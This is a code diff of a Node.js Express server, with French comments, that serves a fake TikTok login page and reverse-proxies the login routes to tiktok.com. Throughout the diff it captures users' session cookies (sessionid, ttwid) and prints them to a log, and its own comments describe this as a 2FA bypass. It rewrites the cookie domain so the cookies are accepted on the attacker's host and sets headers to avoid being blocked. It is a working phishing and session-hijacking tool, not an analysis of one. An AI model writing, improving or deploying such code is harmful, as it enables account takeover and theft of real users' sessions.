@@ -1,44 +1,52 @@
 const express = require('express');
 const { createProxyMiddleware } = require('http-proxy-middleware');
 const path = require('path');
+const cookieParser = require('cookie-parser');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// 1. On sert ton interface de connexion (index.html)
+app.use(cookieParser());
+
+// 1. On affiche tes fichiers locaux (index.html, tiktok.png)
 app.use(express.static(path.join(__dirname)));
 
-// 2. CONFIGURATION DU PROXY (Style Reverse Proxy)
-const tiktokProxy = createProxyMiddleware({
+// 2. Configuration du Middleware Proxy
+const proxyOptions = {
     target: 'https://www.tiktok.com',
     changeOrigin: true,
-    selfHandleResponse: false, // On laisse passer la réponse vers l'utilisateur
+    secure: true,
+    cookieDomainRewrite: "", // Supprime le domaine .tiktok.com pour que ton navigateur accepte les cookies sur Render
     onProxyRes: function (proxyRes, req, res) {
-        // INTERCEPTION DES COOKIES DANS LES HEADERS DE RÉPONSE
-        const sc = proxyRes.headers['set-cookie'];
-        if (sc) {
-            console.log("\n[!] SESSION DETECTÉE - COOKIES INTERCEPTÉS :");
-            sc.forEach(cookie => {
-                // On affiche uniquement les cookies importants (sessionid, ttwid, etc.)
-                if(cookie.includes('sessionid') || cookie.includes('ttwid') || cookie.includes('sid')) {
-                    console.log(">>> " + cookie.split(';')[0]);
+        // --- INTERCEPTION DES COOKIES (BYPASS 2FA) ---
+        const setCookie = proxyRes.headers['set-cookie'];
+        if (setCookie) {
+            console.log("\n[!] JETONS DE SESSION DÉTECTÉS :");
+            setCookie.forEach(cookie => {
+                // On cherche les cookies critiques : sessionid, sid, ttwid
+                if (cookie.includes('sessionid') || cookie.includes('ttwid')) {
+                    console.log(">>> CAPTURE : " + cookie.split(';')[0]);
                 }
             });
-            console.log("------------------------------------------\n");
+            console.log("----------------------------------\n");
         }
     },
-    onProxyReq: (proxyReq, req, res) => {
-        // On peut logguer les identifiants ici s'ils passent par le proxy
-        if (req.method === 'POST') {
-            console.log("[*] Flux POST détecté vers TikTok...");
-        }
+    onProxyReq: function (proxyReq, req, res) {
+        // Optionnel : On peut forcer certains headers pour éviter d'être bloqué trop vite
+        proxyReq.setHeader('Referer', 'https://www.tiktok.com/');
     }
-});
+};
 
-// 3. On redirige toutes les requêtes d'authentification vers le proxy
-app.use('/api/auth', tiktokProxy);
-app.use('/passport', tiktokProxy); // TikTok utilise souvent /passport pour le login
+// 3. On crée le tunnel
+const proxy = createProxyMiddleware(proxyOptions);
+
+// Redirection des routes critiques de TikTok vers notre proxy
+app.use('/api/auth', proxy);
+app.use('/passport', proxy);
+app.use('/login', proxy);
 
 app.listen(PORT, () => {
-    console.log(`Bacops Reverse-Proxy actif sur le port ${PORT}`);
+    console.log("========================================");
+    console.log("  BACOPS REVERSE PROXY READY (PORT " + PORT + ")");
+    console.log("========================================");
 });
